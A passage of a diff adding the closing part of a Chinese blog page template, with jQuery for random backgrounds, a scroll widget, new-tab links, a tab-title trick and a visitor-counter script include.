+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+            
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "!!!∑(ﾟДﾟノ)ノ快回来!!!  " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
